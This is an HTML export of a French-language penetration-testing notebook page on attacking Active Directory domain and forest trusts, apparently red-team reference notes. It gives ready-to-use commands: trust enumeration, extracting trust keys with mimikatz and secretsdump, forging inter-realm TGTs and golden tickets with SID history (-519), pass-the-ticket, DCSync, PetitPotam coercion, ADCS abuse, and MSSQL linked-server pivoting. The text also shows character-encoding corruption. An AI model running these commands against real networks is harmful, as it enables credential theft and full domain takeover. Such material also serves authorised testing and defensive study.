<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>16-Trusts</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>16-Trusts</h1><br/><p><strong>Phase 16 â€” Inter-Domain / Inter-Forest Trusts (Ã©numÃ©ration â†’ exploitation)</strong></p><p><ol><li>1. <h3>1. Ã‰numÃ©ration des trusts</h3></p><p></li></ol><table class="table"><tr><th>Objectif</th><th>Commandes / outils</th><th>Sortie</th></tr><tr><td>Lister tous les trusts du domaine local</td><td>nltest.exe /trusted_domainsâ€‚Â·â€‚(Get-CurrentDomain).GetAllTrustRelationships()</td><td>Type, direction</td></tr><tr><td>BloodHound / Cypher</td><td>SharpHound.exe -c Trusts -d &lt;dom&gt;MATCH p=(d:Domain)-[:TrustedBy]-&gt;(t:Domain) RETURN p</td><td>Graphe visuel</td></tr><tr><td>LDAP brut</td><td>ldeep ldap -u &lt;user&gt; -p &lt;pwd&gt; -d &lt;dom&gt; -s ldap://&lt;dc_ip&gt; trusts</td><td>Attributs de trust</td></tr><tr><td>Get SID dâ€™un domaine cible</td><td>Get-DomainSID -Domain &lt;target_dom&gt;â€‚Â·â€‚lookupsid.py</td><td>SID racine</td></tr></table></p><p><ol><li>2. <h3>2. RÃ©cupÃ©rer la </h3><strong><h3>clÃ© de trust</h3></strong><h3> (Child â†’ Parent)</h3></li><li>Sur le <strong>DC child</strong> :</p><p></li></ol><div class="codebox"><pre>mimikatz lsadump::trust /patch<br /><span style="color:#0088ff;font-weight:400">#ou</span><br />secretsdump.py -just-dc-user <span style="color:#3ad900;font-weight:400">&#39;&lt;parent_dom&gt;$&#39;</span> <span style="color:#333333;font-weight:400">\<br /></span>               -just-dc <span style="color:#ff9d00;font-weight:700">&lt;</span>parent_dom<span style="color:#ff9d00;font-weight:700">&gt;</span> -hashes <span style="color:#ff9d00;font-weight:700">&lt;</span>hash<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div><code></code></p><p><code></code><ol><li>Forger le TGT cross-domain :</p><p></li></ol><div class="codebox"><pre>ticketer.py -nthash <span style="color:#ff9d00;font-weight:700">&lt;</span>trust_key<span style="color:#ff9d00;font-weight:700">&gt;</span> -domain-sid <span style="color:#ff9d00;font-weight:700">&lt;</span>child_SID<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\</span><br />            -domain <span style="color:#ff9d00;font-weight:700">&lt;</span>child_dom<span style="color:#ff9d00;font-weight:700">&gt;</span> -extra-sid <span style="color:#ff9d00;font-weight:700">&lt;</span>parent_SID<span style="color:#ff9d00;font-weight:700">&gt;-</span>519 <span style="color:#333333;font-weight:400">\<br /></span>            /service krbtgt/<span style="color:#ff9d00;font-weight:700">&lt;</span>parent_dom<span style="color:#ff9d00;font-weight:700">&gt;</span> truste4user</pre></div><code></code></p><p><code></code><ol><li> <strong>Pass-the-Ticket</strong> vers le domaine parent.</p><p></li></ol><div class="codebox"><pre>mimikatz kerberos::ptt <span style="color:#ff9d00;font-weight:700">&lt;</span>kirbi<span style="color:#ff9d00;font-weight:700">&gt;</span> </pre></div></p><p></p><p><ol><li>3. <h3>3. </h3><strong><h3>Golden Ticket</h3></strong><h3> parent Ã  partir du child</h3></li><li>AprÃ¨s la phase 2, extraire le hash <strong>krbtgt</strong> du parent </li></ol></p><p></p><p><div class="codebox"><pre>lsadump::dcsync</pre></div></p><p><ul><li>Forger :</p><p></li></ul><div class="codebox"><pre>mimikatz kerberos::golden /user:Administrator /domain:<span style="color:#ff9d00;font-weight:700">&lt;</span>parent_dom<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\<br /></span>         /sid:<span style="color:#ff9d00;font-weight:700">&lt;</span>RootDomainSID<span style="color:#ff9d00;font-weight:700">&gt;</span> /aes256:<span style="color:#ff9d00;font-weight:700">&lt;</span>krbtgt_key<span style="color:#ff9d00;font-weight:700">&gt;</span> /ptt</pre></div><code></code></p><p><code></code></p><p>âœ Admin complet dans la forÃªt racine.</p><p></p><p></p><p><ol><li>4. <h3>4. Abus Parent â†’ Child</h3></li><li>Identique au Child â†’ Parent (hash de trust inversÃ©).</li></ol></p><p><ul><li>Variante rapide : <strong>unconstrained delegation</strong> sur le DC child (coercÃ© via PetitPotam) pour capter un TGT parent.</li></ul></p><p></p><p></p><p><ol><li>5. <h3>5. </h3><strong><h3>External / Forest Trusts</h3></strong></p><p></li></ol><table class="table"><tr><th>Vecteur</th><th>DÃ©tails</th><th>Gain</th></tr><tr><td>Reuse de mot de passe</td><td>MÃªmes comptes admins sur les deux domaines</td><td>Low â†’ Admin</td></tr><tr><td>Groupes Ã©trangers</td><td>BloodHound : MATCH (u:User)-[:MemberOf]-&gt;(g:Group {domain:&lt;foreign&gt;})</td><td>ACL ğŸŸ¦</td></tr><tr><td>SIDHistory</td><td>SIDs hÃ©ritÃ©s traversent la forÃªt</td><td>Golden / Silver ticket</td></tr><tr><td>ADCS abuse</td><td>CA dans le domaine cible â†’ ESC1-11</td><td>Cert Admin</td></tr><tr><td>Unconstrained delegation A â†’ B</td><td>Coerce DC_B sur DC_A, puis relayer</td><td>Ticket cross-forest</td></tr><tr><td>Trust Key (ForestTransitive)</td><td>ticketer.py -nthash &lt;trust_hash&gt; â€¦</td><td>PTT sur forÃªt cible</td></tr></table></p><p><ol><li>6. <h3>6. </h3><strong><h3>MSSQL Linked Servers</h3></strong><h3> (trust indÃ©pendants)</h3></li></ol></p><p><ul><li>MSSQL servers maps domain users to AD roles and thus making them a good lateral movement toool</li><li>Crawl : </p><p></li></ul><div class="codebox"><pre>Get-SQLServerLinkCrawl -Username <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -Password <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> -Instance <span style="color:#ff9d00;font-weight:700">&lt;</span>sql<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p><ul><li>Impacket : </p><p></li></ul><div class="codebox"><pre>mssqlclient.py windows-auth <span style="color:#ff9d00;font-weight:700">&lt;</span>dom<span style="color:#ff9d00;font-weight:700">&gt;</span>/<span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span>@<span style="color:#ff9d00;font-weight:700">&lt;</span>ip<span style="color:#ff9d00;font-weight:700">&gt;</span> â†’ sp_linkedservers + EXEC <span style="color:#333333;font-weight:400">(â€¦)</span> AT <span style="color:#ff9d00;font-weight:700">&lt;</span>link<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div></p><p><ul><li>âœ Pivot base SQL mÃªme si les trusts AD sont restreints.</li></ul></p><p></p><p></p><p><strong>Livrables phase 16</strong><ul><li>Inventaire complet des trusts (type, direction, SID).</li></ul></p><p><ul><li>Hash/clÃ© de trust rÃ©cupÃ©rÃ© + tickets Kerberos forges pour passer dâ€™un domaine/forÃªt Ã  lâ€™autre.</li></ul></p><p><ul><li>ScÃ©narios : Childâ†’Parent, Parentâ†’Child, External / Forest transitive, abuse AD CS &amp; delegation.</li></ul></p><p><ul><li>Scripts prÃªts pour <strong>Pass-the-Ticket</strong> et <strong>Golden/Silver tickets</strong> inter-domaines, ainsi que pour pivots MSSQL cross-forest.</li></ul></p><p></p><p></p></div>
</body>
</html>
